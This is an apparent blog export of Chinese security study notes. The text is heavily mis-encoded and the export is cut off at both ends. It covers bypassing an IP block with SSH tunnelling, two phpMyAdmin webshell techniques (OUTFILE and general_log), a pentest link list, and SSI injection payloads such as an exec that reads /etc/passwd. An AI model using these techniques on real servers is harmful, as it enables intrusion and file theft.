IPÂ∞ÅÁ¶Å„ÄÇ ËøôÈáåÈÅáÂà∞Á¨¨‰∏Ä‰∏™ÈóÆÈ¢òÔºåÂèØ‰ª•ÁúãÂà∞‰∏â‰∏™IP ‰∏çÊòØÂÖ®ÈÉ®Âú®Âêå‰∏Ä‰∏™IPÊÆµÔºåÂ¶ÇÊûú 2Âè∑ Âíå 3 Âè∑‰∫íÁõ∏ËÆøÈóÆÔºå‰ªñ‰ª¨Âú®Âêå‰∏Ä‰∏™IPÊÆµ‰ºöÁõ¥Êé•ËÆøÈóÆÔºåËøôÈáåÔºå3Âè∑Á¶ÅÊ≠¢2Âè∑IPÔºåÂèØ‰ª•Á¶ÅÊ≠¢2Âè∑ËÆøÈóÆÔºå‰ΩÜÊòØ3Âè∑Âíå1Âè∑‰∏çÂú®Âêå‰∏Ä‰∏™IPÊÆµÔºå‰∏îÁâ©ÁêÜÊú∫‰∏éËôöÊãüÊú∫‰πãÈó¥ÁΩëË∑ØÈÄö‰ø°Ë≤å‰ººËøòË¶ÅÁ´ØÂè£ËΩ¨Âèë‰πãÁ±ªÁöÑÊàñËÄÖÊòØÁõ¥Êé•Ëµ∞Áâ©ÁêÜÁΩëÂç°ÔºåÂèçÊ≠£Â∞±ÊòØÁ¶Å‰∫Ü‰πü‰ºöË¢´ÁªïËøáÔºå‰øùËØÅ‰∏âÂè∞ÊúçÂä°Âô®Âú®Âêå‰∏Ä‰∏™IPÊÆµ‰∏ã„ÄÇÂÖ®ÈÉ®Êç¢ÊàêÊ°•Êé•Ê®°ÂºèÔºåÊé•‰∏ãÊù•‰ªéÊñ∞ÊµãËØï„ÄÇ Á¨¨‰∫åÊ¨°Ê®°ÊãüVPNÂà∂‰Ωú‰ªéÊñ∞ÂºÄÂßãÔºÅ ËøôÈáåËôöÊãüÊú∫Êç¢ÊàêÊ°•Êé•Ê®°Âºè„ÄÇ ÈáçÂêØÁΩëÁªúÊúçÂä° service network restart //Êõ¥Êç¢ÁΩëÁªúÊ®°ÂºèË¶ÅÈáçÂêØÁΩëÁªúÔºÅ linux target 1 192.168.100.194 linux target 2 192.168.100.110 linux target 3 192.168.100.176#Á¨¨‰∏ÄÊ≠• ÊúçÂä°Âô®3Âè∑Â∞ÅÁ¶Å linux 1 IP iptables -I INPUT -s 192.168.100.160 -j DROP //Â∞Ülinux1ÁöÑÂåÖËØ∑Ê±ÇÂÖ®ÈÉ®‰∏¢ÂºÉÔºåËÆøÈóÆÂÅúÁïôÂá†ÂçÅÁßíÊúÄÂêéÊó†Ê≥ïËÆøÈóÆ„ÄÇ iptables -A INPUT -s 192.168.100.194 -j REJECT //Â∞ÅÁ¶ÅIP iptables -I INPUT -s 192.168.100.219 -p tcp ‚Äìdport 80 -j ACCEPT Ëß£Èô§ÈôêÂà∂ Ê∏ÖÁ©∫Â∞ÅÊéâÁöÑIPÂú∞ÂùÄÔºåÂèØ‰ª•ËæìÂÖ•Ôºöiptables ‚Äìflush ËÄå 2Âè∑ÊúçÂä°Âô®ÊòØÂèØ‰ª•Ê≠£Â∏∏ËÆøÈóÆ 3Âè∑Ê®°ÊãüË∞∑Ê≠åÊúçÂä°Âô® ËøôÈáåÊàë‰ª¨Â∑≤ÁªèÁ¶Å‰∫Ü‰∏ÄÂè∑ÊúçÂä°Âô®Ôºå‰∏ÄÂè∑ÊúçÂä°Âô®Êù•ËÆøÈóÆ‰∏ã‰∏âÂè∑ÊúçÂä°Âô®„ÄÇ ÂèØ‰ª•ÁúãÂà∞‰∏ÄÂè∑ÊúçÂä°Âô®Â∑≤Êó†Ê≥ïËÆøÈóÆ ‰∏âÂè∑Ë∞∑Ê≠åÊúçÂä°Âô®„ÄÇ #Á¨¨‰∫åÊ≠•Á´ØÂè£ËΩ¨Âèë È¶ñÂÖàÊü•ÁúãËá™Â∑±ÂºÄÂêØÁöÑÁ´ØÂè£ Êàë‰ª¨ÈÄâÊã©‰∏Ä‰∏™Á´ØÂè£1080Á´ØÂè£Âª∫Á´ãÂä®ÊÄÅËΩ¨ÂèëÁöÑÈößÈÅìÔºå Á¨¨‰∏ÄÂè∞ÊúçÂä°Âô®‰∏ãÁöÑÂëΩ‰ª§Ôºössh -D 1080 -fN 192.168.100.110//ËøôÈáåÊàë‰ª¨sshËøûÊé•Á¨¨‰∫åÂè∞ÊúçÂä°Âô®ÔºåÊú¨Âú∞1080Á´ØÂè£ËΩ¨Âèë„ÄÇÁõ∏ÂΩì‰∫éÁ¨¨‰∫åÂè∞ÊúçÂä°Âô®ÊòØ‰∏Ä‰∏™Ë∑≥Êùø„ÄÇ ÂëΩ‰ª§Ê≥®ÈáäÔºö ÈÄâÈ°πÔºö-f ÂêéÂè∞ÂêØÁî® -N ‰∏çÊâìÂºÄËøúÁ®ãshellÔºåÂ§Ñ‰∫éÁ≠âÂæÖÁä∂ÊÄÅÔºà‰∏çÂä†-NÂàôÁõ¥Êé•ÁôªÂΩïËøõÂéªÔºâ -g ÂêØÁî®ÁΩëÂÖ≥ÂäüËÉΩËæìÂÖ•ÂØÜÁ†ÅÂêéÁôªÈôÜÊàêÂäüÔºåÂú®ÂêéÂè∞ËøêË°åÂè™ÊòØÂä†ÂÖ•‰∫Ü‰∏Ä‰∏™ËøõÁ®ã„ÄÇ Ê≠§Êó∂ËÆøÈóÆ ÊúçÂä°Âô®3‰æùÁÑ∂ÊòØ‰∏çÊàêÂäüÁöÑ„ÄÇ ËÆæÁΩÆ‰ª£ÁêÜÊúçÂä°Âô®1ËÆøÈóÆÊúçÂä°Âô®3ÔºåÂëΩ‰ª§Â¶Ç‰∏ãÔºàÂú®ÊúçÂä°Âô®1‰∏äËæìÂÖ•ÔºâÔºö curl --socks5 127.0.0.1:1080 http://192.168.100.176 ÂèØ‰ª•ÁúãÂà∞Â∑≤ÁªèËÆøÈóÆÂà∞Á¨¨‰∏âÂè∞Ê®°ÊãüË∞∑Ê≠åÊµèËßàÂô® #Á¨¨‰∏âÊ≠• ÊµèËßàÂô®ËÆæÁΩÆ‰ª£ÁêÜ1080Á´ØÂè£Â∞±ÂèØ‰ª•ÊµèËßàÂô®‰æøÊç∑ÁöÑËøõË°åËÆøÈóÆ ‰ª£ÁêÜÂâç ‰ª£ÁêÜÂêéÔºåÊàêÂäüËÆøÈóÆ Â¶ÇÊûúÊúâÂ§ßÈôÜ‰ª•Â§ñÁöÑÊúçÂä°Âô®ÔºåÈÇ£‰πà‰æøÂèØ‰ª•Ëá™Â∑±Âà∂‰ΩúVPNÁøªÂ¢ô„ÄÇÁÆÄÂçï‰ΩøÁî®ÔºÅ Âà©Áî®Ë∑≥ÊùøËΩ¨ÂèëÁ´ØÂè£ÂéüÁêÜÊúâ‰∏â‰∏™Êú∫Âô®ÔºåÊàë‰ª¨Âú®Á¨¨‰∫åÂè∞Ë∑≥ÊùøÊú∫Âô®ÊâßË°åÂëΩ‰ª§Ôºå‰ªéËÄå‰ΩøÂæó‰∏ÄÂè∑Âíå‰∏âÂè∑Êú∫Âô®ÂèØ‰ª•‰∫íÁõ∏ËÆøÈóÆ„ÄÇ ËøûÊé•Ê®°ÂºèÔºöÊ°•Êé• linux target 1 192.168.100.110 linux target 2 192.168.100.194 linux target 3 192.168.100.176È¶ñÂÖàÔºåÊàë‰ª¨ÂÖàÊ®°ÊãüÁéØÂ¢ÉÔºåÁî®‰∏âÂè∑ÊúçÂä°Âô®Â∞ÅÁ¶Å‰∏ÄÂè∑ÊúçÂä°Âô®ÁöÑIPÔºå root@kali:~# iptables -A INPUT -s 192.168.100.110 -j REJECT//Á¶ÅÊ≠¢IPËÆøÈóÆ‰ªªÊÑèÁ´ØÂè£ ÂèØ‰ª•ÁúãÂà∞Á¶ÅÊ≠¢192.168.100.110IPËÆøÈóÆÊú¨Êú∫ÁöÑ‰ªªÊÑèÁ´ØÂè£ Êàë‰ª¨‰ΩøÁî®‰∏âÂè∑ÊúçÂä°Âô®ncÁõëÂê¨23Á´ØÂè£„ÄÇ‰∏ÄÂè∑Â∑≤ÁªèËøûÊé•‰∏çÂà∞‰∏âÂè∑ÁöÑ23Á´ØÂè£„ÄÇ‰∫åÂè∑ÊúçÂä°Âô®ÂèØ‰ª•ËøûÊé•‰∏âÂè∑ÊúçÂä°Âô®23Á´ØÂè£„ÄÇÁéØÂ¢ÉÊê≠Âª∫ÂÆåÊØï„ÄÇ root@kali:~# nc -lvvp 23 Êú™ÂÆåÂæÖÁª≠ÔºÅ ÁÑ∂ÂêéÂú®Á¨¨‰∫åÂè∞‰∏ªÊú∫ËæìÂÖ•ÂëΩ‰ª§ ssh -R 9527:192.168.100.176:23 -fN 192.168.100.110 ÁÑ∂ÂêéÊàë‰ª¨Âú® Á¨¨‰∏ÄÂè∞ÊúçÂä°Âô®‰∏äÊâßË°å telnet 127.0.0.1 9527Âç≥ÂèØËÆøÈóÆ„ÄÇ ÂèØ‰ª•ÁúãÂà∞ncÁõëÂê¨ÁöÑÁ¨¨‰∏âÂè∞Êú∫Âô® ÂèØ‰ª•ÁúãÂà∞Êï∞ÊçÆÊòØ‰ªé192.168.100.194ÔºàÁ¨¨‰∏âÂè∞‰∏ªÊú∫ÔºâËΩ¨ÂèëËøáÊù•ÁöÑ ËÆæÁΩÆVPN Âú®Á¨¨‰∫åÂè∞‰∏ªÊú∫ËæìÂÖ•ÂëΩ‰ª§ ssh -R 1080:192.168.100.176:80 -fN 192.168.100.110 ÁÑ∂ÂêéÊàë‰ª¨Âú® Á¨¨‰∏ÄÂè∞ÊúçÂä°Âô®‰∏äÊâßË°å telnet 127.0.0.1 1080Âç≥ÂèØËÆøÈóÆ„ÄÇ ÂèØ‰ª•Ê≠£Â∏∏ËÆøÈóÆÁΩëÈ°µ‰∫Ü„ÄÇÊµèËßàÂô®ËÆæÁΩÆ‰ª£ÁêÜ„ÄÇ ÂèÇËÄÉÔºöhttps://www.cnblogs.com/phpdragon/p/5314650.htmlÂèÇËÄÉÔºöhttps://www.cnblogs.com/keerya/p/7612715.html]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phpmyadmin‰∏§ÁßçÊãøshell]]></title>
    <url>%2F2018%2F11%2F18%2Fphpmyadmin%E6%8B%BFshell%2F</url>
    <content type="text"><![CDATA[ÁÆÄ‰ªãphpMyAdmin ÊòØ‰∏Ä‰∏™‰ª•PHP‰∏∫Âü∫Á°ÄÔºå‰ª•Web-BaseÊñπÂºèÊû∂ÊûÑÂú®ÁΩëÁ´ô‰∏ªÊú∫‰∏äÁöÑMySQLÁöÑÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÂ∑•ÂÖ∑ÔºåËÆ©ÁÆ°ÁêÜËÄÖÂèØÁî®WebÊé•Âè£ÁÆ°ÁêÜMySQLÊï∞ÊçÆÂ∫ì„ÄÇÂÄüÁî±Ê≠§WebÊé•Âè£ÂèØ‰ª•Êàê‰∏∫‰∏Ä‰∏™ÁÆÄÊòìÊñπÂºèËæìÂÖ•ÁπÅÊùÇSQLËØ≠Ê≥ïÁöÑËæÉ‰Ω≥ÈÄîÂæÑÔºåÂ∞§ÂÖ∂Ë¶ÅÂ§ÑÁêÜÂ§ßÈáèËµÑÊñôÁöÑÊ±áÂÖ•ÂèäÊ±áÂá∫Êõ¥‰∏∫Êñπ‰æø„ÄÇÂÖ∂‰∏≠‰∏Ä‰∏™Êõ¥Â§ßÁöÑ‰ºòÂäøÂú®‰∫éÁî±‰∫éphpMyAdminË∑üÂÖ∂‰ªñPHPÁ®ãÂºè‰∏ÄÊ†∑Âú®ÁΩëÈ°µÊúçÂä°Âô®‰∏äÊâßË°åÔºå‰ΩÜÊòØÊÇ®ÂèØ‰ª•Âú®‰ªª‰ΩïÂú∞Êñπ‰ΩøÁî®Ëøô‰∫õÁ®ãÂºè‰∫ßÁîüÁöÑHTMLÈ°µÈù¢Ôºå‰πüÂ∞±ÊòØ‰∫éËøúÁ´ØÁÆ°ÁêÜMySQLÊï∞ÊçÆÂ∫ìÔºåÊñπ‰æøÁöÑÂª∫Á´ã„ÄÅ‰øÆÊîπ„ÄÅÂà†Èô§Êï∞ÊçÆÂ∫ìÂèäËµÑÊñôË°®„ÄÇ‰πüÂèØÂÄüÁî±phpMyAdminÂª∫Á´ãÂ∏∏Áî®ÁöÑphpËØ≠Ê≥ïÔºåÊñπ‰æøÁºñÂÜôÁΩëÈ°µÊó∂ÊâÄÈúÄË¶ÅÁöÑsqlËØ≠Ê≥ïÊ≠£Á°ÆÊÄß„ÄÇ Êö¥ÁªùÂØπË∑ØÂæÑË¶ÅÂÜôÊñá‰ª∂ÂøÖÈ°ªË¶ÅÁü•ÈÅìÊ†πË∑ØÂæÑÔºåÂê¶ÂàôÂç≥‰ΩøÂÜôÂÖ•‰∫Ü‰πüÊó†Ê≥ïËÆøÈóÆÔºå‰πüÂ∞±Ëá™ÁÑ∂Êó†Ê≥ïgetshellÔºå phpmyadminÁõ¥Êé•ÂÜôÂÖ•Êñá‰ª∂ÂÖàË¶ÅÁü•ÈÅìÊ†πË∑ØÂæÑÂà©Áî®ÈîôËØØÁàÜË∑ØÂæÑÁ≠âÔºåËøôÈáåÁî®phpinfoÊü•ÁúãÊ†πË∑ØÂæÑ ÂÜôÂÖ• ‰∏ÄÂè•phpinfoÊñá‰ª∂Ôºå SELECT &quot;&lt;?php phpinfo();?&gt;&quot; INTO OUTFILE &quot;E:\\wamp\\wamp\\www\\2.php&quot;ËøôÈáåÂøÖÈ°ªÊ≥®ÊÑèË¶ÅÂèåÂèçÊñúÁ∫øÔºåÂê¶Âàô‰ºöËΩ¨‰πâÔºå ÂèØ‰ª•ÁúãÂà∞Â∑≤Áªè‰∏ä‰º†Âπ∂‰∏îËß£Êûê Âà©Áî®Êó•ÂøógetshellÂéüÁêÜÔºåphpmyadminÊúâ‰∏Ä‰∏™ËÆ∞ÂΩïÊó•ÂøóÁöÑÊñá‰ª∂Ôºå‰ΩÜÊòØ‰∏ÄËà¨ÊÉÖÂÜµ‰∏ã‰ºöÂÖ≥Èó≠ÔºåÂºÄÂêØÊó•ÂøóËÆ∞ÂΩïÔºåÁÑ∂ÂêéËÆæÁΩÆÊó•ÂøóËÆ∞ÂΩïÂêçÁß∞‰∏∫.phpÔºåÈöè‰æøÊâßË°åsqlËØ≠Âè•ÔºåÂè™Ë¶ÅÂåÖÊã¨‰∏ÄÂè•ËØùÊú®È©¨Â∞±‰ºöË¢´ÂÜôÂÖ•Âà∞Êó•Âøó‰∏≠ÂéªÔºåÁÑ∂ÂêéÂ∞±ÂèØ‰ª•ËøûÊé•getshell Á¨¨‰∏ÄÊ≠•ÊâãÂä®ÂºÄÂêØÊó•Âøó„ÄÇ set global general_log=‚Äôon‚Äô //È¶ñÂÖàËÆæÁΩÆ‰∏∫on ÁÑ∂Âêé Êü•ÁúãÊòØÂê¶ÂºÄÂêØÊàêÂäü show variables like ‚Äúgeneral_log%‚Äù ON‰∏∫ÂºÄÂêØÔºåÊ≠§Êó∂Êàë‰ª¨ËÆæÁΩÆ Êó•ÂøóË∑ØÂæÑ set global general_log_file =&quot;E:\\wamp\\wamp\\www\\3.php&quot; ÁÑ∂ÂêéÂè™Ë¶ÅÊâßË°åÁöÑËØ≠Âè•ÈÉΩ‰ºöÂÜôÂÖ•Âà∞Êó•ÂøóÊñá‰ª∂‰∏≠ÔºåÊâÄ‰ª•Êàë‰ª¨Êü•ËØ¢ËØ≠Âè•select ‚Äò‚Äò ‰ºöÊä•Èîô‰ΩÜÊòØÂ∑≤ÁªèÂÜôÂÖ•Âà∞Êó•Âøó‰∏≠Âéª‰∫Ü Ê≠§Êó∂ËøûÊé•ÁΩëÁ´ô/3.phpÂç≥ÂèØgetshell„ÄÇ]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[‰∏™‰∫∫ÁΩëÂùÄÊî∂Ëóè]]></title>
    <url>%2F2018%2F11%2F18%2F%E7%BD%91%E5%9D%80%E6%94%B6%E8%97%8F%2F</url>
    <content type="text"><![CDATA[webÊ∏óÈÄèÂçöÂÆ¢https://chybeta.github.io/2017/08/19/Web-Security-Learning/ php‰ª£Á†ÅÂÆ°ËÆ°ÂÖ•Èó®ÊÄªÁªìhttp://www.360doc.com/content/16/0215/14/26186435_534767147.shtml http://www.am0s.com/ CTFÂ∑•ÂÖ∑Â∫ìhttps://www.ctftools.com/down/ Â≠êÂüüÂêçÂú®Á∫øÊé•Âè£http://ce.baidu.com http://look.mimaz.org Ëß£ÂØÜcmsËØÜÂà´Á≠âÁªºÂêàÂ∑•ÂÖ∑http://tools.bugscaner.com/ÔºàÂÆûÁî®Ôºâ ÊåáÁ∫πËØÜÂà´http://www.yunsee.cn/ http://finger.tidesec.net/ ÂºÄÊ∫êÔºöhttps://github.com/TideSec/TideFinger?tdsourcetag=s_pcqq_aiomsgwtf_scan ÂºÄÊ∫êÔºöhttps://github.com/dyboy2017/WTF_ScanÁ§æÂ∑•Ê≥®ÂÜåËøáÁΩëÁ´ôÁöÑÊâãÊú∫Âè∑ÈÇÆÁÆ±https://www.reg007.com/s/798648772-at-qq.com// ÁΩëÁõòÁà¨Ëô´http://tansuo233.com Â®ÅËÉÅÊÉÖÊä•ÂàÜÊûêhttps://x.threatbook.cn/ https://poma.nsfocus.com https://ti.360.net https://www.virustotal.com http://www.threatcrowd.org https://community.riskiq.com https://www.venuseye.com.cn https://exchange.xforce.ibmcloud.com/ https://alice.tj-un.com/# Ê∏óÈÄèÂ∑•ÂÖ∑ÈõÜÂêàhttps://www.jianshu.com/p/fc4ed837acac https://blog.csdn.net/Bul1et/article/details/85157176 IPÂèçÊü•http://site.ip138.com]]></content>
      <tags>
        <tag>ÊùÇ</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SSIÊúçÂä°Âô®Ê≥®ÂÖ•]]></title>
    <url>%2F2018%2F11%2F17%2FSSI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%B3%A8%E5%85%A5%2F</url>
    <content type="text"><![CDATA[‰ªÄ‰πàÊòØSSIÂÖ®Á®ãÔºöserver side includes injection ÊúçÂä°Âô®Á´ØÂåÖÂê´Ê≥®ÂÖ• SSIÊòØËã±ÊñáServer Side IncludesÁöÑÁº©ÂÜôÔºåÁøªËØëÊàê‰∏≠ÊñáÂ∞±ÊòØÊúçÂä°Âô®Á´ØÂåÖÂê´ÁöÑÊÑèÊÄù„ÄÇ‰ªéÊäÄÊúØËßíÂ∫¶‰∏äËØ¥ÔºåSSIÂ∞±ÊòØÂú®HTMLÊñá‰ª∂‰∏≠ÔºåÂèØ‰ª•ÈÄöËøáÊ≥®ÈáäË°åË∞ÉÁî®ÁöÑÂëΩ‰ª§ÊàñÊåáÈíà„ÄÇSSIÂÖ∑ÊúâÂº∫Â§ßÁöÑÂäüËÉΩÔºåÂè™Ë¶Å‰ΩøÁî®‰∏ÄÊù°ÁÆÄÂçïÁöÑSSI ÂëΩ‰ª§Â∞±ÂèØ‰ª•ÂÆûÁé∞Êï¥‰∏™ÁΩëÁ´ôÁöÑÂÜÖÂÆπÊõ¥Êñ∞ÔºåÊó∂Èó¥ÂíåÊó•ÊúüÁöÑÂä®ÊÄÅÊòæÁ§∫Ôºå‰ª•ÂèäÊâßË°åshellÂíåCGIËÑöÊú¨Á®ãÂ∫èÁ≠âÂ§çÊùÇÁöÑÂäüËÉΩ„ÄÇÂÆÉ‰∏éCGIÁ±ª‰ººÔºå‰∏çÂêå‰πãÂ§ÑÂú®‰∫éSSIÁî®‰∫éÂú®Âä†ËΩΩÂΩìÂâçÈ°µÈù¢‰πãÂâçÊàñÂú®È°µÈù¢ÂèØËßÜÂåñÊó∂ÊâßË°åÊüê‰∫õÊìç‰Ωú„ÄÇ ‰∏∫Ê≠§ÔºåWebÊúçÂä°Âô®Âú®Â∞ÜÈ°µÈù¢Êèê‰æõÁªôÁî®Êà∑‰πãÂâçÂàÜÊûêSSI ‰ªéÊäÄÊúØËßíÂ∫¶‰∏äÊù•ËØ¥ÔºåSSIÂ∞±ÊòØÂú®HTMLÊñá‰ª∂‰∏≠ÔºåÂèØ‰ª•ÈÄöËøáÊ≥®ÈáäË°åË∞ÉÁî®ÁöÑÂëΩ‰ª§ÊàñÊåáÈíàÔºåÂç≥ÂÖÅËÆ∏ÈÄöËøáÂú®HTMLÈ°µÈù¢Ê≥®ÂÖ•ËÑöÊú¨ÊàñËøúÁ®ãÊâßË°å‰ªªÊÑè‰ª£Á†Å„ÄÇ Âú®ÂæàÂ§öÂú∫ÊôØ‰∏≠ÔºåÁî®Êà∑ËæìÂÖ•ÁöÑÂÜÖÂÆπÂèØ‰ª•ÊòæÁ§∫Âú®È°µÈù¢‰∏≠ÔºåÊØîÂ¶Ç‰∏Ä‰∏™Â≠òÂú®ÂèçÂ∞ÑXSSÊºèÊ¥ûÁöÑÈ°µÈù¢ÔºåÂ¶ÇÊûúËæìÂÖ•ÁöÑpayload‰∏çÊòØxss‰ª£Á†ÅËÄåÊòØssiÁöÑÊ†áÁ≠æÔºåÊúçÂä°Âô®ÂèàÂºÄÂêØ‰∫ÜssiÊîØÊåÅÁöÑËØùÂ∞±‰ºöÂ≠òÂú®SSIÊºèÊ¥û ‰∏ÄÁßçÂØπ‰∫éËøôÁ±ªÊºèÊ¥ûÁöÑÊåñÊéòÊñπÂºèÂç≥ÊòØÊü•Áúã.stmÔºå.shtmÂíå.shtmlÁöÑÈ°µÈù¢ÊòØÂê¶Â≠òÂú®Ôºå‰ΩÜÊòØÁº∫Â∞ëËøô‰∫õÁ±ªÂûãÁöÑÈ°µÈù¢Âπ∂‰∏çÊÑèÂë≥ÁùÄ‰∏çÂ≠òÂú®SSIÊîªÂáª„ÄÇ SSIÊºèÊ¥û‰∫ßÁîüÁöÑÊù°‰ª∂Áî®Êà∑Â≠òÂú®ÂèØÊéßËæìÂÖ•ÔºåÂπ∂‰∏îÊú™ËøáÊª§ÔºåÂπ∂‰∏îËøòËÉΩÂõûÊòæÂµåÂÖ•Âà∞html‰∏≠ÔºåÂ¶ÇÂÖ∂‰∏≠‰∏ÄÊù° &lt;!--#exec cmd=&quot;&quot;...&quot;&quot;--&gt;Ôºà‰ºöÊâßË°åÁªôÂÆöÁöÑ shell ÂëΩ‰ª§ÔºâÂ¶ÇÊûúÊ≤°ÊúâËøáÊª§Âêß&lt;!#‚ÄìÁ≠âÊïèÊÑüÂ≠óÁ¨¶ÔºåÂ∞±‰ºöÈÄ†ÊàêÁ≥ªÁªüÂëΩ‰ª§ÊâßË°åÔºåÈÄöÂ∏∏Â≠òÂú®XSSÁöÑÂú∞ÊñπÂ¶ÇÊûúÂºÄÂêØ‰∫ÜSSIÊúçÂä°ÔºåÈÇ£‰πàÂ∞±‰ºöÈÄ†ÊàêÊúçÂä°Âô®Ê≥®ÂÖ• &lt;!--#include file=&quot;&quot;...&quot;&quot;--&gt;Ôºà‰ºöÊòæÁ§∫ÁªôÂÆöÁöÑÊñá‰ª∂ÔºâSSIÂëΩ‰ª§ËØ≠Ê≥ïËß£Êûê ‚ë†ÊòæÁ§∫ÊúçÂä°Âô®Á´ØÁéØÂ¢ÉÂèòÈáè&lt;#echo&gt; Êú¨ÊñáÊ°£ÂêçÁß∞Ôºö &lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt; Áé∞Âú®Êó∂Èó¥Ôºö &lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt; ÊòæÁ§∫IPÂú∞ÂùÄÔºö &lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;‚ë°Â∞ÜÊñáÊú¨ÂÜÖÂÆπÁõ¥Êé•ÊèíÂÖ•Âà∞ÊñáÊ°£‰∏≠&lt;#include&gt; &lt;!--#include file=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt; &lt;!--#include virtual=&quot;index.html&quot; --&gt; &lt;!--#include virtual=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt; &lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;Ê≥®ÔºöfileÂåÖÂê´Êñá‰ª∂ÂèØ‰ª•Âú®Âêå‰∏ÄÁ∫ßÁõÆÂΩïÊàñÂÖ∂Â≠êÁõÆÂΩï‰∏≠Ôºå‰ΩÜ‰∏çËÉΩÂú®‰∏ä‰∏ÄÁ∫ßÁõÆÂΩï‰∏≠ÔºåvirtualÂåÖÂê´Êñá‰ª∂ÂèØ‰ª•ÊòØWebÁ´ôÁÇπ‰∏äÁöÑËôöÊãüÁõÆÂΩïÁöÑÂÆåÊï¥Ë∑ØÂæÑ ‚ë¢ÊòæÁ§∫WEBÊñáÊ°£Áõ∏ÂÖ≥‰ø°ÊÅØ&lt;#flastmod&gt;&lt;#fsize&gt;(Â¶ÇÊñá‰ª∂Âà∂‰ΩúÊó•Êúü/Â§ßÂ∞èÁ≠â) Êñá‰ª∂ÊúÄËøëÊõ¥Êñ∞Êó•ÊúüÔºö &lt;!--#flastmod file=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt; Êñá‰ª∂ÁöÑÈïøÂ∫¶Ôºö &lt;!--#fsize file=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt;‚ë£Áõ¥Êé•ÊâßË°åÊúçÂä°Âô®‰∏äÁöÑÂêÑÁßçÁ®ãÂ∫è&lt;#exec&gt;(Â¶ÇCGIÊàñÂÖ∂‰ªñÂèØÊâßË°åÁ®ãÂ∫è) &lt;!--#exec cmd=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt; &lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt; &lt;!--#exec cgi=&quot;Êñá‰ª∂ÂêçÁß∞&quot;--&gt; &lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;--&gt;‚ë§‰∏ÄÊ¨°CTF‰∏≠Áî®Âà∞ÁöÑÊåá‰ª§ &lt;!--%23include virtual=&quot;flag&quot; --&gt;1„ÄÅÊòæÁ§∫ÊúçÂä°Âô®Á´ØÁéØÂ¢ÉÂèòÈáè&lt;#echo&gt;2„ÄÅÂ∞ÜÊñáÊú¨ÂÜÖÂÆπÁõ¥Êé•ÊèíÂÖ•Âà∞ÊñáÊ°£‰∏≠&lt;#include&gt;3„ÄÅÊòæÁ§∫WEBÊñáÊ°£Áõ∏ÂÖ≥‰ø°ÊÅØ&lt;#flastmod #fsize&gt; (Â¶ÇÊñá‰ª∂Âà∂‰ΩúÊó•Êúü/Â§ßÂ∞èÁ≠â)4„ÄÅÁõ¥Êé•ÊâßË°åÊúçÂä°Âô®‰∏äÁöÑÂêÑÁßçÁ®ãÂ∫è&lt;#exec&gt;(Â¶ÇCGIÊàñÂÖ∂‰ªñÂèØÊâßË°åÁ®ãÂ∫è)5„ÄÅËÆæÁΩÆSSI‰ø°ÊÅØÊòæÁ§∫Ê†ºÂºè&lt;#config&gt;(Â¶ÇÊñá‰ª∂Âà∂‰ΩúÊó•Êúü/Â§ßÂ∞èÊòæÁ§∫ÊñπÂºè) È´òÁ∫ßSSIÂèØËÆæÁΩÆÂèòÈáè‰ΩøÁî®ifÊù°‰ª∂ËØ≠Âè•„ÄÇ SSIÊåá‰ª§Âü∫Êú¨Ê†ºÂºèÔºö&lt;!-‚Äì Êåá‰ª§ÂêçÁß∞=‚ÄùÊåá‰ª§ÂèÇÊï∞‚Äù&gt; Ê≥®ÊÑèÔºö1Ôºé&lt;!‚Äì‰∏é#Âè∑Èó¥Êó†Á©∫Ê†ºÔºåÂè™ÊúâSSIÊåá‰ª§‰∏éÂèÇÊï∞Èó¥Â≠òÂú®Á©∫Ê†º„ÄÇ2Ôºé‰∏äÈù¢ÁöÑÊ†áÁÇπ=‚Äù‚ÄùÔºå‰∏Ä‰∏™‰πü‰∏çËÉΩÂ∞ë„ÄÇ3ÔºéSSIÊåá‰ª§ÊòØÂ§ßÂ∞èÂÜôÊïèÊÑüÁöÑÔºåÂõ†Ê≠§ÂèÇÊï∞ÂøÖÈ°ªÊòØÂ∞èÂÜôÊâç‰ºöËµ∑‰ΩúÁî®„ÄÇÊúâÁöÑÊó∂ÂÄôÂèØ‰ΩøÁî®`Êù•ÁªïËøáÂØπ‚ÄùÁöÑËøáÊª§//ÊúâÊó∂ÂÄô ÊúâÊó∂ÂÄôÔºå SSIÂëΩ‰ª§Ôºöhttps://www.owasp.org/index.php/Server-Side_Includes_%28SSI%29_Injectionhttps://www.cnblogs.com/wqhwe/p/5442612.html CTFÂÆûÊàòSSIEIS-2018ctfÊåëÊàòËµõ SSIÊºèÊ¥ûÊåñÊéòSSIÊºèÊ¥ûÔºå‰∏ÄËà¨Â≠òÂú®xssÁöÑÂú∞ÊñπÈÉΩÂÄºÂæó‰∏ÄËØï„ÄÇ Âπ∂ÈùûÊâÄÊúâÊñá‰ª∂‰∏≠ÁöÑSSIÊåá‰ª§ÈÉΩ‰ºöË¢´Ëß£ÊûêÔºåÂøÖÈ°ªÂëäËØâApacheÂ∫îËØ•Ëß£ÊûêÂì™‰∫õÊñá‰ª∂„ÄÇÊúâ‰∏§ÁßçÊñπÊ≥ï‰ΩøApacheËß£ÊûêÂ∏¶ÊúâÁâπÂÆöÂêéÁºÄÂêçÁöÑÊñá‰ª∂ÔºåÊØîÂ¶ÇÔºö.shtml ÔºåÈÖçÁΩÆÂ¶Ç‰∏ãÔºö AddType text/html .shtml AddOutputFilter INCLUDES 